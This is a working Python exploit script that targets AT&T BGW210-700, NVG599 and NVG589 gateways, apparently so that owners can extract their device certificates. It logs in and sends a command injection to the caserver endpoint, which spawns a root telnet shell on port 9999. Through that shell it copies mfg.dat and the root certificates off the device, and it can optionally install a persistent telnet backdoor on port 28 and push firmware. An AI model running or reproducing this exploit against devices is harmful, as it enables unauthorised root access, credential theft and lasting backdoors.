from urllib.parse import urlencode
import requests
import telnetlib
import time
import argparse
from bs4 import BeautifulSoup
import socket
import wget
import os
import sys
import tarfile
import shutil
import glob
import urllib3
import http.server
import socketserver
import threading

LATEST_BGW210_FIRMWARE = "2.6.4"
LATEST_NVG599_FIRMWARE = "11.5.0h0d51"
LATEST_NVG589_FIRMWARE = "11.5.0h0d51"

SERVER_ADDRESS = "192.168.1.50"
SERVER_PORT = 8000
DEVICE_ADDR = "192.168.1.254"

##########################################
# This area contains all aux functions
##########################################
def is_open(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.5)
    try:
        s.connect((DEVICE_ADDR, int(port)))
        s.shutdown(2)
        return True
    except:
        return False


def fail():
    print("exploit failed. please try again")
    print("if this continues to fail, try rebooting")
    sys.exit(1)


def verify_input(res):
    if res != "n" and res != "y":
        print("incorrect input")
        start()


def usage():
    return "extract_mfg.py --access_code=\"<enter_access_code>\" --installBackdoor --updateFirmware \nthe device access code is printed on the side of " \
           "your modem \nit's needed to login and exploit the caserver binary "

def create_server():
    handler = http.server.SimpleHTTPRequestHandler
    httpd = socketserver.TCPServer(("", SERVER_PORT), handler)
    print("serving at port: " + str(SERVER_PORT))
    httpd.serve_forever()

def start():
    parser = argparse.ArgumentParser(usage=usage())
    parser.add_argument("--access_code", help="enter access code here", required=True)
    parser.add_argument("--installBackdoor", action='store_true', help="install backdoor telnet port 28", required=False)
    parser.add_argument("--updateFirmware", action='store_true', help="update firmware to version specified", required=False)
    args = parser.parse_args()

    if not is_open(80):
        print("unable to connect to modem")
        fail()

    url = "http://" + DEVICE_ADDR + "/cgi-bin/sysinfo.ha"
    response = requests.get(url)
    parsed_html = BeautifulSoup(response.content, features="lxml")
    info_table = parsed_html.find("table")

    # collect table of info
    rows = list()
    for row in info_table.findAll("tr"):
        rows.append(row)

    # get model number
    model_number = "".join(rows[1].text.split()[2])
    #get serial model_number
    serial_number = "".join(rows[2].text.split()[2])
    # get version string from 3rd element of table
    ver_string = "".join(rows[3].text.split()[2])

    print("Gateway Found!")
    print("Model: " + model_number)
    print("Firmware: " + ver_string)
    print("Serial: " + serial_number)
    directory = model_number + "_" + serial_number

    latestFirmware = ""
    updateFirmware = args.updateFirmware and ver_string != LATEST_BGW210_FIRMWARE and ver_string != LATEST_NVG599_FIRMWARE and ver_string != LATEST_NVG589_FIRMWARE
    if updateFirmware:
        thread = threading.Thread(target=create_server, args=())
        thread.daemon = True
        thread.start()

    telnet28 = is_open(28)
    telnet9999 = is_open(9999)
    if model_number.find("BGW210-700") != -1:
        latestFirmware = "http://"+SERVER_ADDRESS+":"+str(SERVER_PORT)+"/firmware/bgw210-700/spTurquoise210-700_"+LATEST_BGW210_FIRMWARE+".bin"
        if ver_string.find("1.0.29") == -1 and not telnet28 and not telnet9999:
            print("Incorrect software version")
            print("Downgrade BGW210-700 to 1.0.29 and come back")
            sys.exit(0)
        elif not telnet28 and not telnet9999:
            exploit(args.access_code)
    elif model_number.find("NVG599") != -1:
        latestFirmware = "http://"+SERVER_ADDRESS+":"+str(SERVER_PORT)+"/firmware/nvg599/spnvg599-"+LATEST_NVG599_FIRMWARE+".bin"
        if ver_string.find("9.2.2h0d83") == -1 and ver_string.find("9.2.2h0d79") == -1 and not telnet28 and not telnet9999:
            print("Incorrect software version")
            print("Downgrade NVG599 to 9.2.2h0d83, or upgrade to 9.2.2h0d79 and come back")
            sys.exit(0)
        elif not telnet28 and not telnet9999:
            exploit(args.access_code)
    elif model_number.find("NVG589") != -1:
        latestFirmware = "http://"+SERVER_ADDRESS+":"+str(SERVER_PORT)+"/firmware/nvg589/spnvg589-"+LATEST_NVG589_FIRMWARE+".bin"
        if not telnet28 and not telnet9999:
            print("Telnet is not open on port 28 or 9999, root then start telnet and come back")
            sys.exit(0)
    else:
        print("Incorrect Gateway Model, this script is only known to work on a BGW210-700, NVG599, or NVG589")
        sys.exit(0)

    # Attempt to extract files from telnet port 28 or 9999
    if telnet28:
        print("Attempting to extract files from telnet port 28")
        extractfiles(28, args.access_code, False, directory, latestFirmware, updateFirmware)
    elif telnet9999:
        print("Attempting to extract files from telnet port 9999")
        extractfiles(9999, args.access_code, args.installBackdoor, directory, latestFirmware, updateFirmware)
    else:
        sys.exit(1)

##########################################
# This area contains all functions
# that communicate with the RG
##########################################

def send_command(tn, cmd):
    tn.write(cmd.encode('ascii') + b"\n")
    time.sleep(1)
    print(tn.read_very_eager().decode('ascii'))

# responsible for authenticating to the RG
def login(password):
    ipalloc_url = "http://" + DEVICE_ADDR + "/cgi-bin/ipalloc.ha"
    login_url = "http://" + DEVICE_ADDR + "/cgi-bin/login.ha"
    response = requests.get(ipalloc_url)

    headers = {
        'User-Agent': 'test-agent',
        'Connection': 'close',
        'Origin': 'http://192.168.1.254',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': 'http://192.168.1.254/cgi-bin/ipalloc.ha',
    }

    parsed_html = BeautifulSoup(response.content, features="lxml")
    nonce = parsed_html.find('input', {'nonce': ''}).get('value')
    params = {'nonce': nonce, 'password': password, 'Continue': "Continue"}
    response = requests.post(login_url, data=urlencode(params), headers=headers)

    if response.text.find("password") != -1:
        print("Login failed")
        fail()

def exploit(access_code):
    exploit_url = " https://" + DEVICE_ADDR + ":49955/caserver"
    exploit_param = "appid=001&set_data=| /usr/sbin/telnetd -l /bin/sh -p 9999|"

    print("logging in")
    login(access_code)
    print("\nlogin success")
    print("running command injection")
    headers = {
        'User-Agent': 'test-agent',
        'Connection': 'Keep-Alive'
    }

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    injection = requests.post(exploit_url, headers=headers, data=exploit_param, auth=('tech', ''), verify=False)
    if injection.text.find("OK") == -1 or not is_open(9999):
        print("command injection failure")
        fail()

    print("Command injection success!\n")

def extractfiles(port, access_code, installBackdoor, directory, latestFirmware, updateFirmware):
    mount_cp_files_cmd1 = "mkdir /tmp/certs"
    mount_cp_files_cmd2 = "mount mtd:mfg -t jffs2 /mfg && cp /mfg/mfg.dat /tmp/certs/ && umount /mfg"
    mkdir_tmp_images_cmd = "mkdir /tmp/images"
    mount_imgs_cmd = "mount -o blind /tmp/images /www/att/images"
    mount_cp_files_cmd3 = "cp /etc/rootcert/*.der /tmp/certs"
    mount_cp_files_cmd4 = "cd /tmp/certs"
    mount_cp_files_cmd5 =  "tar cf Files\ from\ Gateway.tar *.d*"
    mount_cp_files_cmd6 =  "cp Files\ from\ Gateway.tar /www/att/images"
    create_telnet_backdoor_cmd = "echo 28telnet stream tcp nowait root /usr/sbin/telnetd -i -l /bin/nsh > /var/etc/inetd.d/telnet28\npfs -a /var/etc/inetd.d/telnet28\npfs -s"
    nsh_telnet_cmd = "/bin/nsh"
    reboot_cmd = "reboot"

    if not is_open(port):
        print("telnet is not open - fail")
        fail()

    print("Opening telnet shell")
    tn = telnetlib.Telnet(host=DEVICE_ADDR, port=port)

    if port == 28:
        send_command(tn, "admin")
        send_command(tn, access_code)
        send_command(tn, "!")

    send_command(tn, mount_cp_files_cmd1)
    send_command(tn, mount_cp_files_cmd2)
    send_command(tn, mkdir_tmp_images_cmd)
    send_command(tn, mount_imgs_cmd)
    send_command(tn, mount_cp_files_cmd3)
    send_command(tn, mount_cp_files_cmd4)
    send_command(tn, mount_cp_files_cmd5)
    send_command(tn, mount_cp_files_cmd6)
    print("downloading files")
    url = 'http://' + DEVICE_ADDR + '/images/Files from Gateway.tar'
    wget.download(url)
    print("")

    if installBackdoor and port == 9999:
        print("installing backdoor telnet port 28")
        send_command(tn, create_telnet_backdoor_cmd)

    if updateFirmware and latestFirmware:
        if port == 28:
            send_command(tn, "exit")
        if port == 9999:
            send_command(tn, nsh_telnet_cmd)
            send_command(tn, "admin")
            send_command(tn, access_code)
        print("Updating firmware to latest")
        send_command(tn, "fwinstall " + latestFirmware)
        print(tn.read_until(b"validated", 45).decode('ascii'))
    else:
        send_command(tn, "reboot")

    destination = directory + "/Files_from_Gateway"
    if not os.path.exists (destination):
        os.makedirs(destination)

    print("Extracting tar")
    tar = tarfile.open("Files from Gateway.tar", "r:")
    tar.extractall(path=destination)
    tar.close()
    os.remove("Files from Gateway.tar")

    print("Copying mfg_dat_decode")
    copiedMfgDat = destination + "/mfg_dat_decode.exe"
    shutil.copy("mfg_dat_decode.exe", copiedMfgDat)

    print("Running mfg_dat_decode")
    os.chdir(destination)
    os.system("mfg_dat_decode.exe > ../Output_from_mfg_dat_decode.txt")

    print("Cleaning Up")
    os.remove("mfg_dat_decode.exe")
    for file in glob.glob("*.tar.gz"):
        shutil.move(file, "../")

    print("Done!")
    sys.exit(0)

start()
